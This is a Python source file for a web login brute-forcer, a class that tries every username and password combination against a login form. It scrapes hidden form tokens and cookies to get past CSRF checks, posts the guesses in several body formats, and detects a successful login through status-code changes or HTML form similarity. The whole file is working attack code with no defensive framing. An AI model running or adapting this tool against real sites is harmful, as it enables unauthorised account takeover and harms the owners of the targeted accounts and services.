import logging
import sys
import requests
from bs4 import BeautifulSoup

class htmlBrute:
    
    def __init__(self, url, web_parser,  pass_user) -> None:
        self._url = url
        self._web_parser = web_parser
        self._pass_user = pass_user
    
    def brute(self) -> None:
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """
        for username in self._pass_user["Usernames"]:
            for password in self._pass_user["Passwords"]:
                self._attack(username, password)

    def _attack(self, username, password) -> None:
        """
        create a packet containing fake headers and the payload(username,password) and submit it to the server
        """

        get_response = requests.get(self._url)
        body = get_response.text

        soup = BeautifulSoup(body, "html.parser")

        payload = self._web_parser.post_data
        cookies = get_response.cookies
        payload[ self._web_parser.user_param ] = username
        payload[ self._web_parser.password_param ] = password

        for token in payload:
            if token != self._web_parser.user_param and token != self._web_parser.password_param:
                inputs = soup.find("input", {"name": token})
                if inputs:
                    payload[token] = inputs["value"]
                    logging.debug(str(payload[token]) + ' value has changed to ' + str(inputs["value"]))

        payload, cookies = self._change_cookiesToken(cookies, payload)

        logging.info("[+ payload]: " + str(payload))
        
        post_response = self._post(payload, cookies)

        if self._check_login(post_response, get_response):
            logging.info(
                "login successfull\n\nusername: "
                + username
                + "\npassword: "
                + password
            )

            sys.exit(1)

    def _post(self, payload, cookies) -> requests.models.Response:
        header = self._web_parser.headers
        header['accept-encoding'] = 'identity'
        if self._web_parser.req_body_type == "XML":
                pass

        elif self._web_parser.req_body_type == "JSON":
            post_response = requests.post(self._web_parser.action, json=payload, cookies=cookies, headers=header)

        elif self._web_parser.req_body_type == "multipart":
            for param in payload:
                payload[param] = (None, payload[param])
            post_response = requests.post(self._web_parser.action, files=payload, cookies=cookies, headers=header)

        else:
            post_response = requests.post(self._web_parser.action, data=payload, cookies=cookies, headers=header)
            
        if len(post_response.history) > 0:
              self.status_code = post_response.history[0].status_code
        else:
            self.status_code = post_response.status_code
        return post_response

    def _check_login(self, post_response, get_response) -> bool:
        """
        checks if login was successful by checking if status code changed and checks if form is still in the page
        """

        if self.status_code >= 400:
            return False

        elif self.status_code != self._web_parser.status_code:
            logging.info('[check_login] Status code changed!: ' + str(self.status_code))
            return True
        
        from html_similarity import style_similarity, structural_similarity, similarity
        k=0.3
        parser = BeautifulSoup(post_response.text, 'html.parser')
        forms = parser.findAll('form')
        webParser_form = self._web_parser.form
        max_similarity = 0
        for web_form in forms:
            similarity = k * structural_similarity(str(webParser_form), str(web_form)) + (1 - k) * style_similarity(str(webParser_form), str(web_form))
            if similarity > max_similarity:
                max_similarity = similarity
        logging.info(' max_similarity: ' + str( max_similarity))
        if max_similarity < 0.8:
            logging.info('[check_login] max_similarity: ' + str(max_similarity))      
            return True

        return False


    ########################################################################################


    def _change_cookiesToken(self, cookies_jar, req_body) -> tuple:
        cookies = {}
        for cookie in cookies_jar:
            cookies[cookie.name] = cookie.value

        for item in cookies.keys():
            if item[1:] in req_body:
                req_body[item[1:]] = cookies[item]
            if item in req_body:
                req_body[item] = cookies[item]
        if len(cookies) == 0:
            cookies = None

        return req_body, cookies

